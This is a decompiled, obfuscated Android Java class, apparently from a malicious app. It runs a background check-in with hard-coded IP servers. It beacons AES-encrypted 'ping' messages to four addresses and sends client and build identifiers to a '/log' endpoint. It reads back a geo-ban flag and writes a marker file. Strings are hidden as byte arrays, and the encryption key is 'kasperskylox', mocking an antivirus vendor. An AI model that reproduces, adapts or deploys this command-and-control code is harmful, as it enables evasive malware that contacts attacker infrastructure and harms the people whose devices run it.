package TJANu768e41aRbOB.TJANu6a6d9ceRbOB;

import TJANu601f538RbOB.TJANu28ebd7fRbOB.TJANu221acc9RbOB.TJANu357b19bRbOB;
import android.content.Context;
import android.util.Base64;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import kotlin.jvm.internal.ByteCompanionObject;
import org.apache.http.protocol.HTTP;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class TJANu548902cRbOB {

    /* JADX INFO: renamed from: TJANu768e41aRbOB.TJANu6a6d9ceRbOB.TJANu548902cRbOB$1, reason: invalid class name */
    public final class AnonymousClass1 implements Runnable {
        final Object WUhKn4be0f08eZ0R = new Object();
        volatile String WUhKna2bedab5Z0R = null;

        /* JADX INFO: renamed from: TJANu768e41aRbOB.TJANu6a6d9ceRbOB.TJANu548902cRbOB$1$TJANud3c3e30RbOB */
        public class TJANud3c3e30RbOB implements Runnable {
            private final String WUhKnd0cf0462Z0R;

            public TJANud3c3e30RbOB(String str) {
                this.WUhKnd0cf0462Z0R = str;
            }

            static String GRUy51aeee199Hp() {
                return new String("/ping".getBytes(), HTTP.UTF_8);
            }

            @Override // java.lang.Runnable
            public void run() {
                try {
                    if (AnonymousClass1.this.testNameMethod(this.WUhKnd0cf0462Z0R + GRUy51aeee199Hp(), 2500)) {
                        synchronized (AnonymousClass1.this.WUhKn4be0f08eZ0R) {
                            if (AnonymousClass1.this.WUhKna2bedab5Z0R == null) {
                                AnonymousClass1.this.WUhKna2bedab5Z0R = this.WUhKnd0cf0462Z0R;
                                AnonymousClass1.this.WUhKn4be0f08eZ0R.notifyAll();
                            }
                        }
                    }
                } catch (Exception unused) {
                }
            }
        }

        static String GRUy5035fb04dHp() {
            return new String("AES/CBC/PKCS5Padding".getBytes(), HTTP.UTF_8);
        }

        static String GRUy507e3e4d2Hp() {
            return new String("testNameMethod запущен".getBytes(), HTTP.UTF_8);
        }

        static String GRUy508afa82bHp() {
            return new String("http://193.111.117.72:8080".getBytes(), HTTP.UTF_8);
        }

        static String GRUy50dfe8f3eHp() {
            return new String("is_banned".getBytes(), HTTP.UTF_8);
        }

        static String GRUy517f8938dHp() {
            return new String("marker".getBytes(), HTTP.UTF_8);
        }

        static String GRUy518ad78e9Hp() {
            return new String("http://193.221.200.242:8080".getBytes(), HTTP.UTF_8);
        }

        static String GRUy526319175Hp() {
            return new String("UTF-8".getBytes(), HTTP.UTF_8);
        }

        private void GRUy53148976cHp(Context context, int i) {
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(new File(context.getFilesDir(), TJANu357b19bRbOB.WUhKndba2a861Z0R));
                fileOutputStream.write(i);
                fileOutputStream.close();
            } catch (Exception unused) {
            }
        }

        static String GRUy532e7c0ffHp() {
            return new String(new byte[]{-48, -102, -48, -66, -48, -67, -48, -67, -48, -75, -48, -70, -47, -126, 33}, HTTP.UTF_8);
        }

        static String GRUy536f11b96Hp() {
            return new String("/log".getBytes(), HTTP.UTF_8);
        }

        static String GRUy53ffe421dHp() {
            return new String("build".getBytes(), HTTP.UTF_8);
        }

        static String GRUy54438a04bHp() {
            return new String(new byte[]{-48, -95, -48, -75, -48, -71, -47, -121, -48, -80, -47, -127, 32, -48, -73, -48, -80, -48, -65, -47, -125, -47, -127, -47, -126, -48, -72, -47, -126, -47, -127, -47, -113, 32, 114, 117, 110}, HTTP.UTF_8);
        }

        static String GRUy546b57ad4Hp() {
            return new String("LongLoad".getBytes(), HTTP.UTF_8);
        }

        static String GRUy54b39df91Hp() {
            return new String("http://185.100.157.51:8080".getBytes(), HTTP.UTF_8);
        }

        static String GRUy555a001b7Hp() {
            return new String("LongLoad".getBytes(), HTTP.UTF_8);
        }

        static String GRUy55b895145Hp() {
            return new String("LongLoad".getBytes(), HTTP.UTF_8);
        }

        static String GRUy579a08226Hp() {
            return new String(new byte[]{-48, -88, -48, -72, -47, -124, -47, ByteCompanionObject.MIN_VALUE, -48, -66, -48, -78, -48, -80, -48, -67, -47, -117, -48, -71, 32, -48, -73, -48, -80, -48, -65, -47, ByteCompanionObject.MIN_VALUE, -48, -66, -47, -127, 32, -48, -66, -47, -126, -48, -65, -47, ByteCompanionObject.MIN_VALUE, -48, -80, -48, -78, -48, -69, -48, -75, -48, -67}, HTTP.UTF_8);
        }

        static String GRUy57f8c8553Hp() {
            return new String("LongLoad".getBytes(), HTTP.UTF_8);
        }

        static String GRUy586d6b9f3Hp() {
            return new String("LongLoad".getBytes(), HTTP.UTF_8);
        }

        static String GRUy587d095bfHp() {
            return new String("pong!".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5917022d5Hp() {
            return new String("POST".getBytes(), HTTP.UTF_8);
        }

        static String GRUy59d5e07a9Hp() {
            return new String("client".getBytes(), HTTP.UTF_8);
        }

        private boolean GRUy5a9edb556Hp(String urlString, int timeout) throws Exception {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(GRUy59d5e07a9Hp(), TJANufe3319cRbOB.WUhKn08ca4f99Z0R);
            jSONObject.put(GRUy53ffe421dHp(), TJANufe3319cRbOB.WUhKn949a8690Z0R);
            jSONObject.put(GRUy517f8938dHp(), GRUy532e7c0ffHp());
            String strEncodeToString = Base64.encodeToString(GRUy5c0dc4cc5Hp(jSONObject.toString().getBytes()), 2);
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(urlString).openConnection();
            httpURLConnection.setConnectTimeout(timeout);
            httpURLConnection.setReadTimeout(timeout);
            httpURLConnection.setRequestMethod(GRUy5af34148dHp());
            httpURLConnection.setDoOutput(true);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(strEncodeToString.getBytes(GRUy5e9268d63Hp()));
            outputStream.close();
            return new JSONObject(new String(GRUy5d8d0d133Hp(Base64.decode(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream())).readLine(), 2)))).getBoolean(GRUy50dfe8f3eHp());
        }

        static String GRUy5aad713b5Hp() {
            return new String("http://193.111.117.70:8080".getBytes(), HTTP.UTF_8);
        }

        private SecretKeySpec GRUy5ac54550cHp() throws NoSuchAlgorithmException, UnsupportedEncodingException {
            return new SecretKeySpec(MessageDigest.getInstance(GRUy5cf54d2c6Hp()).digest(GRUy5fe5b4198Hp().getBytes(GRUy5b152dab7Hp())), GRUy5e8d1a381Hp());
        }

        static String GRUy5af34148dHp() {
            return new String("POST".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5b152dab7Hp() {
            return new String("UTF-8".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5b24928c9Hp() {
            return new String("Geo banned".getBytes(), HTTP.UTF_8);
        }

        private byte[] GRUy5c0dc4cc5Hp(byte[] plainTextBytes) throws Exception {
            SecretKeySpec secretKeySpecGRUy5ac54550cHp = GRUy5ac54550cHp();
            Cipher cipher = Cipher.getInstance(GRUy5035fb04dHp());
            byte[] bArr = new byte[16];
            new SecureRandom().nextBytes(bArr);
            cipher.init(1, secretKeySpecGRUy5ac54550cHp, new IvParameterSpec(bArr));
            byte[] bArrDoFinal = cipher.doFinal(plainTextBytes);
            byte[] bArr2 = new byte[bArr.length + bArrDoFinal.length];
            System.arraycopy(bArr, 0, bArr2, 0, bArr.length);
            System.arraycopy(bArrDoFinal, 0, bArr2, bArr.length, bArrDoFinal.length);
            return bArr2;
        }

        static String GRUy5cf54d2c6Hp() {
            return new String("SHA-256".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5d4957142Hp() {
            return new String("ping!".getBytes(), HTTP.UTF_8);
        }

        private byte[] GRUy5d8d0d133Hp(byte[] encryptedIvBytes) throws Exception {
            SecretKeySpec secretKeySpecGRUy5ac54550cHp = GRUy5ac54550cHp();
            byte[] bArr = new byte[16];
            System.arraycopy(encryptedIvBytes, 0, bArr, 0, 16);
            byte[] bArr2 = new byte[encryptedIvBytes.length - 16];
            System.arraycopy(encryptedIvBytes, 16, bArr2, 0, encryptedIvBytes.length - 16);
            Cipher cipher = Cipher.getInstance(GRUy5f91e6e78Hp());
            cipher.init(2, secretKeySpecGRUy5ac54550cHp, new IvParameterSpec(bArr));
            return cipher.doFinal(bArr2);
        }

        static String GRUy5de6bc5daHp() {
            return new String(new byte[]{116, 101, 115, 116, 78, 97, 109, 101, 77, 101, 116, 104, 111, 100, 32, -48, -73, -48, -80, -48, -70, -48, -66, -48, -67, -47, -121, -48, -75, -48, -67}, HTTP.UTF_8);
        }

        static String GRUy5e8d1a381Hp() {
            return new String("AES".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5e8df6ba8Hp() {
            return new String(new byte[]{-48, -97, -48, -72, -48, -67, -48, -77, -48, -66, -48, -78, -48, -80, -48, -67, -48, -72, -48, -75, 32, -48, -70, -48, -66, -48, -67, -47, -121, -48, -72, -48, -69, -48, -66, -47, -127, -47, -116}, HTTP.UTF_8);
        }

        static String GRUy5e9268d63Hp() {
            return new String("UTF-8".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5f91e6e78Hp() {
            return new String("AES/CBC/PKCS5Padding".getBytes(), HTTP.UTF_8);
        }

        static String GRUy5fe5b4198Hp() {
            return new String("kasperskylox".getBytes(), HTTP.UTF_8);
        }

        /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
        @Override // java.lang.Runnable
        public void run() {
            Context contextGRUy58f9c982fHp = TJANu357b19bRbOB.GRUy58f9c982fHp();
            Log.d(GRUy57f8c8553Hp(), GRUy54438a04bHp());
            String[] strArr = {GRUy54b39df91Hp(), GRUy5aad713b5Hp(), GRUy518ad78e9Hp(), GRUy508afa82bHp()};
            for (int i = 0; i < 4; i++) {
                new Thread(new TJANud3c3e30RbOB(strArr[i])).start();
            }
            Object obj = this.WUhKn4be0f08eZ0R;
            synchronized (obj) {
                try {
                    if (this.WUhKna2bedab5Z0R == null) {
                        obj.wait(5000L);
                    }
                } catch (InterruptedException unused) {
                }
            }
            if (this.WUhKna2bedab5Z0R != null) {
                try {
                    StringBuilder sb = new StringBuilder();
                    String str = this.WUhKna2bedab5Z0R;
                    String strGRUy586d6b9f3Hp = GRUy586d6b9f3Hp();
                    String strGRUy5e8df6ba8Hp = GRUy5e8df6ba8Hp();
                    Log.d(strGRUy586d6b9f3Hp, strGRUy5e8df6ba8Hp);
                    Log.d(strGRUy586d6b9f3Hp, strGRUy5e8df6ba8Hp);
                    sb.append(str);
                    sb.append(GRUy536f11b96Hp());
                    boolean zGRUy5a9edb556Hp = GRUy5a9edb556Hp(sb.toString(), 10000);
                    GRUy555a001b7Hp();
                    GRUy579a08226Hp();
                    if (zGRUy5a9edb556Hp) {
                        GRUy53148976cHp(contextGRUy58f9c982fHp, 2);
                        throw new RuntimeException(GRUy5b24928c9Hp());
                    }
                } catch (Exception unused2) {
                }
            }
            GRUy53148976cHp(contextGRUy58f9c982fHp, 1);
        }

        /* JADX WARN: Unreachable blocks removed: 1, instructions: 2 */
        public boolean testNameMethod(String urlString, int timeout) throws Exception {
            Log.d(GRUy55b895145Hp(), GRUy507e3e4d2Hp());
            String strEncodeToString = Base64.encodeToString(GRUy5c0dc4cc5Hp(GRUy5d4957142Hp().getBytes()), 2);
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(urlString).openConnection();
            httpURLConnection.setConnectTimeout(timeout);
            httpURLConnection.setReadTimeout(timeout);
            httpURLConnection.setRequestMethod(GRUy5917022d5Hp());
            httpURLConnection.setDoOutput(true);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(strEncodeToString.getBytes(GRUy526319175Hp()));
            outputStream.close();
            return new String(GRUy5d8d0d133Hp(Base64.decode(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream())).readLine(), 2))).equals(GRUy587d095bfHp());
        }
    }

    public static void GRUy5a7166b60Hp() {
        new Thread(new AnonymousClass1()).start();
    }
}
